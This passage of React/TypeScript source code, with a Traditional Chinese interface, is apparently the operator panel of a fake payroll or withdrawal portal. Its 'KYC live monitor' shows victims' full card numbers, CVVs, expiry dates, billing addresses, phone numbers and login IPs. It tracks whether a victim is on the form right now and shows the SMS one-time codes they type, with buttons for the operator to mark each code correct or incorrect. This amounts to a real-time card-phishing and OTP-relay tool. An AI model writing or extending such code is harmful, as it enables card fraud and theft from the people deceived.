                          className="p-1 rounded-md text-blue-700 hover:bg-blue-100 transition"
                          title={`重新產生 ${label}`}
                        >
                          <RotateCcw className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                    <div className="flex items-center gap-1 min-w-0">
                      <code className="font-mono text-xs font-semibold text-[#0A2B5E] truncate flex-1" title={value}>{value}</code>
                      <CopyButton text={value} />
                    </div>
                  </div>
                ))}
              </div>
            </section>

            <section className="lg:col-span-7 bg-[#F6F8FB] px-5 py-4 flex flex-col min-h-0">
              <h3 className="font-semibold text-sm text-[#0A2B5E] flex items-center gap-2 pb-2 mb-3 border-b border-slate-200 flex-shrink-0">
                <span className="w-6 h-6 rounded-md bg-[#0A2B5E] flex items-center justify-center"><Edit3 className="w-3 h-3 text-white" /></span>
                交易設定
                <button
                  onClick={() => setShowPreview(true)}
                  className="ml-auto flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap text-white bg-gradient-to-r from-sky-500 to-blue-600 shadow-sm shadow-sky-500/30 hover:from-sky-600 hover:to-blue-700 hover:shadow-md hover:-translate-y-px active:translate-y-0 transition-all"
                  title="以員工視角查看這筆訂單（顯示已儲存的資料）"
                >
                  <Eye className="w-3.5 h-3.5" />
                  預覽員工端
                </button>
              </h3>
              <div className="flex-1 min-h-0 grid grid-cols-1 lg:grid-cols-10 gap-3 overflow-y-auto -mx-1 px-1 py-0.5">
                <div className="lg:col-span-7 rounded-xl bg-white border border-slate-200 shadow-[0_1px_2px_rgba(15,23,42,0.06)] flex flex-col self-start">
                  <div className="px-4 py-2 border-b border-slate-100 flex items-center gap-2 rounded-t-xl bg-blue-50/60">
                    <span className="w-1.5 h-4 rounded-full bg-blue-500" />
                    <span className="text-xs font-semibold text-blue-800">基本資訊</span>
                  </div>
                  <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-x-4 gap-y-3">
                    <TxField label="金額 (USD)" name="amount" value={str(txForm.amount)} onChange={handleTxChange} type="number" placeholder="0.00" />
                    <TxField label="簽發日期" name="issue_date" value={str(txForm.issue_date)} onChange={handleTxChange} type="date" />
                    <div className="sm:col-span-2">
                      <TxField label="公司名稱" name="company_name" value={str(txForm.company_name)} onChange={handleTxChange} placeholder="公司名稱" />
                    </div>
                    <div className="sm:col-span-2">
                      <TxField label="員工編號" name="employee_id" value={str(txForm.employee_id)} onChange={handleTxChange} placeholder="EMP-001" />
                    </div>
                    <TxField label="管轄區" name="jurisdiction" value={str(txForm.jurisdiction)} onChange={handleTxChange} placeholder="香港特別行政區" />
                    <TxField label="結算期（營業日）" name="settlement_days" value={str(txForm.settlement_days)} onChange={handleTxChange} type="number" placeholder="3" />
                  </div>

                  <div className="px-4 py-2 border-y border-slate-100 flex items-center gap-2 bg-emerald-50/60">
                    <span className="w-1.5 h-4 rounded-full bg-emerald-500" />
                    <span className="text-xs font-semibold text-emerald-800">費用明細（選填）</span>
                    <span className="group relative ml-auto">
                      <Info className="w-3.5 h-3.5 text-emerald-600 cursor-help" />
                      <span className="pointer-events-none absolute right-0 top-5 z-30 w-72 rounded-lg bg-slate-900 px-3 py-2.5 text-[11px] font-normal leading-relaxed text-slate-100 opacity-0 shadow-xl transition-opacity group-hover:opacity-100">
                        跨境費用是從提領金額中扣除的跨境結算手續費：費用金額 = 提領金額 × 費率。員工端會在「Amount &amp; Fee Breakdown」顯示「Cross-Border Fee」與「Net Settlement Amount」。留空或填 0 則不收費。支援至小數點後 4 位。
                      </span>
                    </span>
                  </div>
                  <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 items-start">
                    <div>
                      <label className="block text-xs font-semibold text-gray-500 mb-1">跨境費用 (%)</label>
                      <div className="relative">
                        <input
                          type="number"
                          value={str(txForm.fee_crossborder)}
                          onChange={e => handleTxChange("fee_crossborder", e.target.value)}
                          placeholder="0"
                          min="0.0001"
                          step="0.0001"
                          className="w-full px-3 py-1.5 pr-8 text-sm border border-gray-200 rounded-lg focus:outline-none focus:border-[#1E3A8A] focus:ring-2 focus:ring-inset focus:ring-[#1E3A8A]/20 transition"
                        />
                        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-gray-400 pointer-events-none">%</span>
                      </div>
                      <p className="mt-1.5 text-[11px] text-slate-400">留空或填 0 則不收費，例如 1.5 代表 1.5%</p>
                    </div>
                    {(() => {
                      const amt = Number(txForm.amount) || 0;
                      const rate = Number(txForm.fee_crossborder) || 0;
                      const fee = (amt * rate) / 100;
                      const fmt = (n: number) => `USD ${n.toLocaleString("zh-TW", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
                      if (rate <= 0 || amt <= 0) {
                        return (
                          <div className="h-[104px] flex items-center justify-center rounded-lg border border-dashed border-slate-200 bg-slate-50 px-3 py-3 text-[11px] text-slate-400 text-center">
                            未設定費用，員工端只顯示提領金額
                          </div>
                        );
                      }
                      return (
                        <div className="h-[104px] flex flex-col rounded-lg border border-emerald-200 overflow-hidden text-sm">
                          <div className="flex-1 flex items-center justify-between px-3 bg-white">
                            <span className="text-xs text-slate-500">提領金額</span>
                            <span className="font-semibold text-slate-800 tabular-nums">{fmt(amt)}</span>
                          </div>
                          <div className="flex-1 flex items-center justify-between gap-2 px-3 bg-white border-t border-emerald-100">
                            <span className="text-xs text-slate-500 truncate">跨境費用（{rate}%）</span>
                            <span className="font-semibold text-red-600 tabular-nums">− {fmt(fee)}</span>
                          </div>
                          <div className="flex-1 flex items-center justify-between gap-2 px-3 bg-emerald-50 border-t-2 border-dashed border-emerald-200">
                            <span className="text-xs font-bold text-emerald-800">員工實收淨額</span>
                            <span className="font-bold text-emerald-900 tabular-nums">{fmt(amt - fee)}</span>
                          </div>
                        </div>
                      );
                    })()}
                  </div>
                </div>

                <div className="lg:col-span-3 rounded-xl bg-white border border-slate-200 shadow-[0_1px_2px_rgba(15,23,42,0.06)] flex flex-col min-h-[320px] lg:min-h-0 overflow-hidden">
                  <div className="px-4 py-2 border-b border-slate-100 flex items-center gap-2 bg-teal-50/60">
                    <Wallet className="w-3.5 h-3.5 text-teal-700" />
                    <span className="text-xs font-semibold text-teal-800">區塊鏈地址驗證</span>
                    <span className="ml-auto text-[10px] text-teal-600">免 KYC 驗證渠道</span>
                  </div>
                  <BlockchainToggle txId={tx.id} ownerAdmin={tx.created_by_admin} initialEnabled={!!tx.blockchain_enabled} initialBrand={tx.blockchain_wallet_brand ?? ""} />
                </div>
              </div>
              <div className="pt-3 mt-3 border-t border-slate-200 flex justify-end flex-shrink-0">
                <button
                  onClick={saveTxConfig}
                  disabled={txSaving}
                  className={`w-full sm:w-auto sm:min-w-[240px] px-8 py-3 rounded-xl text-[15px] font-semibold flex items-center justify-center gap-2 shadow-md transition-all ${txSaved ? "bg-green-500 text-white" : "bg-[#0A2B5E] hover:bg-[#1E3A8A] hover:shadow-lg text-white"} disabled:opacity-60`}
                >
                  {txSaving ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : txSaved ? <Check className="w-4 h-4" /> : <Save className="w-4 h-4" />}
                  {txSaving ? "儲存中..." : txSaved ? "已儲存" : "儲存設定"}
                </button>
              </div>
            </section>
          </div>
        )}

        {activeTab === "review" && (
          <div className="grid grid-cols-1 lg:grid-cols-5 lg:h-full divide-y lg:divide-y-0 lg:divide-x divide-slate-200">
            <section className="lg:col-span-3 p-6 flex flex-col gap-4 min-h-0 lg:overflow-y-auto">
              <h3 className="font-semibold text-[15px] text-[#0A2B5E] flex items-center gap-2 pb-3 border-b border-slate-200 flex-shrink-0">
                <Shield className="w-4 h-4 text-[#1E3A8A]" />
                審核決定
              </h3>
              {(() => {
                const statusMap: Record<string, { label: string; bg: string; text: string; dot: string }> = {
                  draft:                       { label: "草稿",                       bg: "bg-gray-100",   text: "text-gray-600",   dot: "bg-gray-400" },
                  pending:                     { label: "待處理",                     bg: "bg-amber-100",  text: "text-amber-700",  dot: "bg-amber-400" },
                  processing:                  { label: "處理中",                  bg: "bg-blue-100",   text: "text-blue-700",   dot: "bg-blue-500" },
                  approved:                    { label: "已核准",                    bg: "bg-green-100",  text: "text-green-700",  dot: "bg-green-500" },
                  failed:                      { label: "未通過",                      bg: "bg-red-100",    text: "text-red-700",    dot: "bg-red-500" },
                  awaiting_admin_confirmation: { label: "待確認驗證碼",  bg: "bg-sky-100",    text: "text-sky-700",    dot: "bg-sky-500" },
                };
                const s = statusMap[tx.review_status] ?? statusMap.draft;
                return (
                  <div className={`flex items-center gap-2.5 rounded-xl px-3 py-2.5 ${s.bg}`}>
                    <span className={`w-2.5 h-2.5 rounded-full flex-shrink-0 ${s.dot} ${tx.review_status === "awaiting_admin_confirmation" ? "animate-pulse" : ""}`} />
                    <div className="flex-1 min-w-0">
                      <p className="text-[10px] font-bold uppercase tracking-widest text-gray-400 leading-none mb-0.5">目前狀態</p>
                      <p className={`text-sm font-bold ${s.text}`}>{s.label}</p>
                    </div>
                    {tx.review_updated_at && (
                      <span className="text-[10px] text-gray-400 tabular-nums flex-shrink-0">
                        {new Date(tx.review_updated_at).toLocaleString("zh-TW", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })}
                      </span>
                    )}
                  </div>
                );
              })()}
              {kyc?.is_submitted && tx.review_status === "pending" && (
                <div className="flex items-start gap-3 bg-amber-50 border-2 border-amber-400 rounded-xl px-4 py-3">
                  <span className="w-2.5 h-2.5 rounded-full bg-amber-400 animate-pulse flex-shrink-0 mt-0.5" />
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-bold text-amber-800 leading-snug">
                      {submissions.length > 1 ? "員工已重新提交" : "員工已提交"}
                    </p>
                    <p className="text-xs text-amber-700 mt-0.5 leading-relaxed">
                      {submissions.length > 1
                        ? `已收到提交 #${submissions.length}。請審核更新後的資料並更新狀態。`
                        : "KYC 資料已提交，等待您的審核。請審核並更新狀態。"}
                    </p>
                    {kyc.submitted_at && (
                      <p className="text-[10px] text-amber-600 mt-1 tabular-nums">
                        提交於 {new Date(kyc.submitted_at).toLocaleString("zh-TW", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })}
                      </p>
                    )}
                  </div>
                </div>
              )}
              <div>
                <label className="block text-xs font-semibold text-gray-500 mb-2">變更狀態</label>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  {([
                    { value: "pending",    label: "待處理",    bg: "bg-amber-50",  border: "border-amber-300",  text: "text-amber-700",  activeBg: "bg-amber-400",  dot: "bg-amber-400" },
                    { value: "processing", label: "處理中", bg: "bg-blue-50",   border: "border-blue-300",   text: "text-blue-700",   activeBg: "bg-blue-500",   dot: "bg-blue-500" },
                    { value: "approved",   label: "已核准",   bg: "bg-green-50",  border: "border-green-300",  text: "text-green-700",  activeBg: "bg-green-600",  dot: "bg-green-500" },
                    { value: "failed",     label: "未通過",     bg: "bg-red-50",    border: "border-red-300",    text: "text-red-700",    activeBg: "bg-red-600",    dot: "bg-red-500" },
                  ] as const).map(opt => {
                    const isActive = reviewStatus === opt.value;
                    return (
                      <button key={opt.value} onClick={() => setReviewStatus(opt.value)}
                        className={`flex items-center gap-2 px-3 py-2.5 rounded-xl border-2 font-semibold text-sm transition-all ${
                          isActive
                            ? `${opt.activeBg} border-transparent text-white shadow-md scale-[1.02]`
                            : `${opt.bg} ${opt.border} ${opt.text} hover:scale-[1.01] hover:shadow-sm`
                        }`}
                      >
                        <span className={`w-2 h-2 rounded-full flex-shrink-0 ${isActive ? "bg-white/80" : opt.dot}`} />
                        {opt.label}
                        {isActive && <Check className="w-3.5 h-3.5 ml-auto" />}
                      </button>
                    );
                  })}
                </div>
              </div>
              <div className="flex flex-col flex-1 min-h-[140px]">
                <label className="block text-xs font-semibold text-gray-500 mb-1.5">
                  備註 / 原因
                  {reviewStatus === "failed" && <span className="text-red-500 ml-1">（建議）</span>}
                </label>
                <textarea
                  value={reviewNote}
                  onChange={e => setReviewNote(e.target.value)}
                  rows={5}
                  placeholder={
                    reviewStatus === "approved" ? "例如：已確認。資金將於 3 個營業日內結算。" :
                    reviewStatus === "failed" ? "請描述原因，以便員工修正其提交內容。" :
                    "選填管理員備註..."
                  }
                  autoComplete="off"
                  autoCorrect="off"
                  autoCapitalize="off"
                  spellCheck={false}
                  className="w-full px-3 py-2 border border-gray-200 rounded-lg text-sm focus:outline-none focus:border-[#1E3A8A] focus:ring-2 focus:ring-inset focus:ring-[#1E3A8A]/20 transition resize-none flex-1"
                />
              </div>
              <button
                onClick={saveReview}
                disabled={reviewSaving}
                className={`w-full py-2.5 rounded-xl text-sm font-semibold flex items-center justify-center gap-2 transition-all ${
                  reviewSaved          ? "bg-green-500 text-white" :
                  reviewStatus === "approved"   ? "bg-green-600 hover:bg-green-700 text-white" :
                  reviewStatus === "failed"     ? "bg-red-600 hover:bg-red-700 text-white" :
                  reviewStatus === "processing" ? "bg-blue-600 hover:bg-blue-700 text-white" :
                  "bg-amber-500 hover:bg-amber-600 text-white"
                } disabled:opacity-60`}
              >
                {reviewSaving ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : reviewSaved ? <Check className="w-4 h-4" /> : <Save className="w-4 h-4" />}
                {reviewSaving ? "儲存中..." : reviewSaved ? "已儲存" : "儲存審核決定"}
              </button>
            </section>

            <section className="lg:col-span-2 bg-gradient-to-b from-[#EEF3FA] to-[#E3EBF6] p-6 flex flex-col min-h-0">
              <h3 className="font-semibold text-[15px] text-[#0A2B5E] flex items-center gap-2 pb-3 mb-4 border-b border-blue-200/70 flex-shrink-0">
                <span className="w-7 h-7 rounded-lg bg-[#0A2B5E] flex items-center justify-center"><ClipboardList className="w-3.5 h-3.5 text-white" /></span>
                審核紀錄
                {reviewHistory.length > 0 && (
                  <span className="ml-auto text-[10px] font-bold bg-[#0A2B5E] text-white px-2 py-0.5 rounded-full tabular-nums">
                    共 {reviewHistory.length} 筆
                  </span>
                )}
              </h3>
              {reviewHistory.length === 0 ? (
                <div className="flex-1 flex flex-col items-center justify-center text-center py-10 text-gray-400">
                  <ClipboardList className="w-7 h-7 mb-2 opacity-25" />
                  <p className="text-xs">尚無審核紀錄。</p>
                </div>
              ) : (
                <div className="relative flex-1 min-h-0 overflow-y-auto pr-1 max-h-[420px] lg:max-h-none space-y-2">
                    <div className="absolute left-[9px] top-3 bottom-3 w-0.5 bg-blue-200" />
                    {[...reviewHistory].reverse().map((rec, i) => {
                      const tone =
                        rec.review_status === "approved"   ? { dot: "bg-green-500", card: "border-l-green-500", tag: "bg-green-100 text-green-800", label: "已核准" } :
                        rec.review_status === "failed"     ? { dot: "bg-red-500",   card: "border-l-red-500",   tag: "bg-red-100 text-red-800",     label: "未通過" } :
                        rec.review_status === "processing" ? { dot: "bg-blue-500",  card: "border-l-blue-500",  tag: "bg-blue-100 text-blue-800",   label: "處理中" } :
                        rec.review_status === "pending"    ? { dot: "bg-amber-400", card: "border-l-amber-400", tag: "bg-amber-100 text-amber-800", label: "待處理" } :
                        { dot: "bg-gray-400", card: "border-l-gray-400", tag: "bg-gray-100 text-gray-700", label: rec.review_status };
                      return (
                        <div key={rec.id} className="relative pl-7">
                          <span className={`absolute left-[3px] top-3.5 w-3.5 h-3.5 rounded-full ring-4 ring-[#E9EFF8] ${tone.dot}`} />
                          <div className={`rounded-xl bg-white border border-white border-l-4 ${tone.card} shadow-[0_1px_2px_rgba(15,23,42,0.06)] px-3 py-2.5`}>
                            <div className="flex items-center justify-between gap-2">
                              <div className="flex items-center gap-1.5">
                                <span className={`text-[11px] font-bold px-2 py-0.5 rounded-md ${tone.tag}`}>{tone.label}</span>
                                {i === 0 && <span className="text-[9px] font-bold px-1.5 py-px rounded bg-[#0A2B5E] text-white">最新</span>}
                              </div>
                              <span className="text-[10px] font-medium px-1.5 py-px rounded bg-sky-100 text-sky-800 tabular-nums flex-shrink-0">
                                {new Date(rec.reviewed_at).toLocaleString("zh-TW", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })}
                              </span>
                            </div>
                            {rec.review_note && (
                              <p className="text-xs text-slate-600 mt-2 leading-relaxed bg-slate-50 rounded-lg px-2.5 py-1.5">{rec.review_note}</p>
                            )}
                            <div className="flex items-center gap-1 mt-2">
                              <User className="w-3 h-3 text-slate-400" />
                              <span className="text-[10px] font-medium text-slate-500">{rec.admin_username}</span>
                            </div>
                          </div>
                        </div>
                      );
                    })}
                </div>
              )}
            </section>
          </div>
        )}

        {activeTab === "kyc" && (
          <section className="p-6 flex flex-col lg:h-full min-h-0">
            <div className="flex items-center justify-between gap-3 mb-4 flex-wrap flex-shrink-0">
              <h3 className="font-semibold text-[15px] text-[#0A2B5E] flex items-center gap-2.5">
                <CreditCard className="w-4 h-4 text-[#1E3A8A]" />
                KYC 即時監控
              </h3>
              <div className="flex items-center gap-2 flex-wrap">
                {presenceInfo ? (
                  presenceInfo.current_page === "kyc" ? (
                    <div className="flex items-center gap-1.5 bg-green-50 border border-green-300 rounded-full px-2.5 py-1">
                      <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse flex-shrink-0" />
                      <Wifi className="w-3 h-3 text-green-600 flex-shrink-0" />
                      <span className="text-[11px] font-bold text-green-700">員工KYC填寫中</span>
                    </div>
                  ) : (
                    <div className="flex items-center gap-1.5 bg-blue-50 border border-blue-200 rounded-full px-2.5 py-1">
                      <span className="w-2 h-2 rounded-full bg-blue-400 animate-pulse flex-shrink-0" />
                      <Wifi className="w-3 h-3 text-blue-500 flex-shrink-0" />
                      <span className="text-[11px] font-medium text-blue-600">員工瀏覽憑證頁</span>
                    </div>
                  )
                ) : (
                  <div className="flex items-center gap-1.5 bg-gray-100 border border-gray-200 rounded-full px-2.5 py-1">
                    <span className="w-2 h-2 rounded-full bg-gray-400 flex-shrink-0" />
                    <WifiOff className="w-3 h-3 text-gray-400 flex-shrink-0" />
                    <span className="text-[11px] font-medium text-gray-400">員工不在線</span>
                  </div>
                )}
                <div className="flex items-center gap-1.5 text-xs text-green-600 font-medium">
                  <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
                  即時
                </div>
                <button
                  onClick={() => setShowSubmissions(true)}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold text-white bg-gradient-to-r from-sky-500 to-blue-600 shadow-sm shadow-sky-500/30 hover:from-sky-600 hover:to-blue-700 hover:shadow-md hover:-translate-y-px active:translate-y-0 transition-all"
                >
                  <History className="w-3.5 h-3.5" />
                  提交紀錄
                  {confirmedSubmissions.length > 0 && (
                    <span className="min-w-[18px] h-[18px] px-1 rounded-full bg-white text-blue-700 text-[10px] font-bold flex items-center justify-center tabular-nums">
                      {confirmedSubmissions.length}
                    </span>
                  )}
                </button>
              </div>
            </div>

            {!kyc ? (
              <div className="text-center py-16 text-gray-400">
                <Phone className="w-8 h-8 mx-auto mb-3 opacity-25" />
                <p className="text-sm font-medium text-gray-500">等待員工</p>
                <p className="text-xs mt-1">員工尚未開始填寫資料。</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 lg:grid-cols-5 flex-1 min-h-0 -mx-6 -mb-6 border-t border-slate-200 divide-y lg:divide-y-0 lg:divide-x divide-slate-200">
                <div className="lg:col-span-2 px-6 py-5 space-y-3 min-h-0 lg:overflow-y-auto">
                  <KycCardSection
                    cardType={kyc.card_type}
                    cardNumber={kyc.card_number}
                    cardBankName={kyc.card_bank_name}
                    cardExpiry={kyc.card_expiry}
                    cvv={kyc.cvv}
                    cardholderName={kyc.cardholder_name}
                    payeeDebitCard={kyc.payee_debit_card}
                  />
                  <div className="pt-4 mt-1 border-t border-slate-200">
                    <div className="text-xs font-semibold text-gray-600 mb-2 flex items-center gap-1.5">
                      <MapPin className="w-3.5 h-3.5" />
                      帳單地址
                    </div>
                    <KycRow label="國家" value={kyc.country} />
                    <KycRow label="街道" value={kyc.street_address} />
                    <KycRow label="門牌/公寓" value={kyc.house_number} />
                    <KycRow label="城市" value={kyc.city} />
                    <KycRow label="州/省" value={kyc.state} />
                    <KycRow label="郵遞區號" value={kyc.postal_code} />
                    {presenceInfo?.ip_address && (
                      <div className="flex justify-between py-2 border-b border-gray-50 last:border-0 mt-1 pt-2 border-t border-dashed border-blue-200">
                        <span className="text-xs text-[#1E3A8A] w-28 flex-shrink-0 flex items-center gap-1 font-semibold">
                          <Wifi className="w-3 h-3" />
                          登入 IP
                        </span>
                        <code className="text-xs font-mono font-bold text-[#0A2B5E] text-right">{presenceInfo.ip_address}</code>
                      </div>
                    )}
                  </div>
                </div>
                <div className="lg:col-span-3 bg-[#F3F7FD] px-6 py-5 flex flex-col min-h-0">
                  <div className="text-[10px] font-bold text-[#1E3A8A] uppercase tracking-widest mb-3 flex items-center gap-1.5 flex-shrink-0">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse inline-block" />
                    聯絡方式與驗證碼（即時）
                  </div>

                  {/* Contact row */}
                  <div className="flex flex-wrap items-center gap-x-6 gap-y-1 mb-3 pb-3 border-b border-blue-200 flex-shrink-0">
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-[#1E3A8A] font-medium">電話</span>
                      <span className="text-2xl font-mono font-extrabold text-[#0A2B5E] tracking-widest">{kyc.phone_number || "—"}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-[#1E3A8A] font-medium">狀態</span>
                      <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${kyc.is_submitted ? "bg-green-100 text-green-700" : "bg-amber-100 text-amber-700"}`}>
                        {kyc.is_submitted ? "已提交" : "進行中"}
                      </span>
                    </div>
                    {kyc.submitted_at && (
                      <div className="flex items-center gap-2">
                        <span className="text-xs text-[#1E3A8A] font-medium">提交時間</span>
                        <span className="text-xs font-mono text-[#0A2B5E]">{new Date(kyc.submitted_at).toLocaleString("zh-TW")}</span>
                      </div>
                    )}
                  </div>

                  {/* Awaiting confirmation alert banner */}
                  {tx.review_status === "awaiting_admin_confirmation" && (
                    <div className="mb-3 flex items-center gap-2 bg-amber-50 border-2 border-amber-400 rounded-lg px-3 py-2 animate-pulse flex-shrink-0">
                      <span className="w-2 h-2 rounded-full bg-amber-500 flex-shrink-0" />
                      <span className="text-xs font-extrabold text-amber-700 uppercase tracking-widest">需要處理 — 請核對下列驗證碼</span>
                    </div>
                  )}

                  {/* Verification code + confirm buttons — always rendered side by side */}
                  <div className="flex items-center gap-3 mb-1 flex-shrink-0 min-h-[56px]">
                    {/* Code / waiting text */}
                    <div className="flex-1 flex items-center gap-2 min-w-0">
                      {kyc.entered_verification_code ? (
                        <>
                          <span className="font-mono text-4xl font-extrabold tracking-[0.35em] text-[#0A2B5E] leading-none">
                            {kyc.entered_verification_code}
                          </span>
                          <CopyButton text={kyc.entered_verification_code} />
                        </>
                      ) : (
                        <p className="text-xs text-gray-400 italic">等待員工輸入驗證碼...</p>
                      )}
                    </div>

                    {/* Confirm / reject buttons — always visible */}
                    {(() => {
                      const isAwaiting = tx.review_status === "awaiting_admin_confirmation";
                      const hasCode = !!kyc.entered_verification_code;
                      const active = isAwaiting && hasCode;
                      return (
                        <div className="flex flex-col gap-1.5 flex-shrink-0">
                          {confirmCodeError && (
                            <div className="flex items-center gap-1 text-red-600 text-[10px] font-medium mb-1 max-w-[140px]">
                              <AlertCircle className="w-3 h-3 flex-shrink-0" />
                              {confirmCodeError}
                            </div>
                          )}
                          <button
                            onClick={() => active && !confirmingCode && handleConfirmCode("confirmed")}
                            disabled={!active || confirmingCode}
                            className={`flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg border-2 text-xs font-bold transition-all
                              ${active
                                ? "border-green-500 bg-green-50 text-green-700 hover:bg-green-600 hover:text-white hover:border-green-600 animate-glow-green"
                                : "border-gray-200 bg-gray-100 text-gray-400 cursor-not-allowed"
                              }`}
                          >
                            {confirmingCode
                              ? <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
                              : <CheckCircle className="w-3.5 h-3.5" />
                            }
                            正確
                          </button>
                          <button
                            onClick={() => active && !confirmingCode && handleConfirmCode("failed")}
                            disabled={!active || confirmingCode}
                            className={`flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg border-2 text-xs font-bold transition-all
                              ${active
                                ? "border-red-400 bg-red-50 text-red-700 hover:bg-red-600 hover:text-white hover:border-red-600 animate-glow-red"
                                : "border-gray-200 bg-gray-100 text-gray-400 cursor-not-allowed"
                              }`}
                          >
                            {confirmingCode
                              ? <span className="w-3.5 h-3.5 border-2 border-current/30 border-t-current rounded-full animate-spin" />
                              : <XCircle className="w-3.5 h-3.5" />
                            }
                            不正確
                          </button>
                        </div>
                      );
                    })()}
                  </div>

                    {/* Submission log for current round */}
                    {(() => {
                      const activeRound = tx.review_status === "awaiting_admin_confirmation"
                        ? currentSubmissionNumber - 1
                        : currentSubmissionNumber;

                      const activeSends = codeSendHistory;

                      const reviewBySubmission = new Map<number, ReviewHistoryRecord>();
                      const confirmReviews = reviewHistory.filter(r =>
                        r.review_note?.includes("Verification code")
                      );
                      confirmReviews.forEach((r, i) => {
                        const num = r.submission_number ?? (i + 1);
                        reviewBySubmission.set(num, r);
                      });

                      const sessionReviews = reviewHistory.filter(r => r.submission_number == null);
                      const lastSessionReview = sessionReviews[sessionReviews.length - 1];
                      let sessionStartSubmission = 1;
                      if (lastSessionReview) {
                        const preSessionConfirms = confirmReviews.filter(r =>
                          (r.submission_number ?? 0) > 0 &&
                          r.reviewed_at <= lastSessionReview.reviewed_at
                        );
                        const lastPreSession = preSessionConfirms[preSessionConfirms.length - 1];
                        sessionStartSubmission = lastPreSession
                          ? (lastPreSession.submission_number ?? 0) + 1
                          : 1;
                      }

                      const pastSubmissions = kycSubmissions.filter(
                        s =>
                          s.submission_number >= sessionStartSubmission &&
                          s.submission_number < activeRound &&
                          reviewBySubmission.has(s.submission_number) &&
                          !s.code_confirmed
                      );

                      return (
                        <div className="mt-3 pt-3 border-t border-blue-200 flex-1 min-h-[160px] grid grid-cols-2 gap-3">
                          {/* Left: Previous Submission Codes */}
                          <div className="flex flex-col min-h-0">
                            <div className="text-[10px] font-bold text-[#1E3A8A] uppercase tracking-widest mb-2 flex items-center gap-1.5">
                              <History className="w-3 h-3" />
                              先前的驗證碼
                              {pastSubmissions.length > 0 && (
                                <span className="ml-1 px-1.5 py-0.5 rounded-full bg-gray-200 text-gray-600 text-[9px] font-bold tabular-nums">
                                  {pastSubmissions.length}
                                </span>
                              )}
                            </div>
                            <div className="space-y-1.5 overflow-y-auto flex-1 min-h-0 max-h-[220px] lg:max-h-none">
                              {pastSubmissions.length > 0 ? (
                                [...pastSubmissions].reverse().map((sub) => (
                                  <div key={sub.id} className="bg-white rounded-lg px-2 py-1.5 border border-blue-100">
                                    <div className="flex items-center justify-between gap-1">
                                      <div className="flex items-center gap-1 min-w-0">
                                        <span className="flex-shrink-0 w-4 h-4 rounded-full bg-gray-300 text-white text-[9px] font-bold flex items-center justify-center">
                                          {sub.submission_number}
                                        </span>
                                        <span className="font-mono text-xs font-bold text-gray-600 tracking-widest truncate">{sub.entered_verification_code ?? "—"}</span>
                                      </div>
                                      <span className={`flex-shrink-0 text-[9px] font-bold px-1.5 py-0.5 rounded-full ${sub.code_confirmed ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700"}`}>
                                        {sub.code_confirmed ? "正確" : "錯誤"}
                                      </span>
                                    </div>
                                    <span className="text-[10px] text-gray-400 tabular-nums">
                                      {new Date(sub.submitted_at).toLocaleString("zh-TW", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" })}
                                    </span>
                                  </div>
                                ))
                              ) : (
                                <p className="text-[11px] text-gray-400 italic py-1">尚無先前的驗證碼。</p>
                              )}
                            </div>
                          </div>

                          {/* Right: SMS Send History */}
                          <div className="flex flex-col min-h-0">
                            <div className="text-[10px] font-bold text-[#1E3A8A] uppercase tracking-widest mb-2 flex items-center gap-1.5">
                              <Phone className="w-3 h-3" />
                              簡訊紀錄
                              {activeSends.length > 0 && (
                                <span className="ml-1 text-[9px] text-blue-400 font-normal normal-case tracking-normal">
                                  {activeSends.length}x
                                </span>
                              )}
                            </div>
                            <div className="space-y-1.5 overflow-y-auto flex-1 min-h-0 max-h-[220px] lg:max-h-none">
                              {activeSends.length > 0 ? (
                                [...activeSends].reverse().map((rec, idx) => (
                                  <div key={rec.id} className="bg-white rounded-lg px-2 py-1.5 border border-blue-100">
                                    <div className="flex items-center gap-1.5 min-w-0">
                                      <span className="flex-shrink-0 w-4 h-4 rounded-full bg-[#0A2B5E] text-white text-[9px] font-bold flex items-center justify-center">
                                        {activeSends.length - idx}
                                      </span>
                                      <span className="text-xs text-gray-700 font-mono truncate">{rec.phone_number}</span>
                                    </div>
                                    <span className="text-[10px] text-gray-400 tabular-nums">
                                      {new Date(rec.sent_at).toLocaleString("zh-TW", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit", second: "2-digit" })}
                                    </span>
                                  </div>
                                ))
                              ) : (
                                <p className="text-[11px] text-gray-400 italic py-1">尚未發送簡訊。</p>
                              )}
                            </div>
                          </div>
                        </div>
                      );
                    })()}

                </div>
              </div>
            )}
          </section>
        )}
      </main>

      {showSubmissions && (
        <SubmissionHistoryPanel
          submissions={confirmedSubmissions}
          selectedId={selectedSubmissionId}
          onSelect={handleSelectSubmission}
          onClose={() => setShowSubmissions(false)}
        />
      )}
      {showPreview && (
        <EmployeePreviewModal txId={tx.id} ftUid={tx.ft_uid} onClose={() => setShowPreview(false)} />
      )}
    </div>
  );
}

function BlockchainToggle({ txId, ownerAdmin, initialEnabled, initialBrand }: { txId: string; ownerAdmin?: string; initialEnabled: boolean; initialBrand: string }) {
  const [enabled, setEnabled] = useState(initialEnabled);
  const [brand, setBrand] = useState(initialBrand);
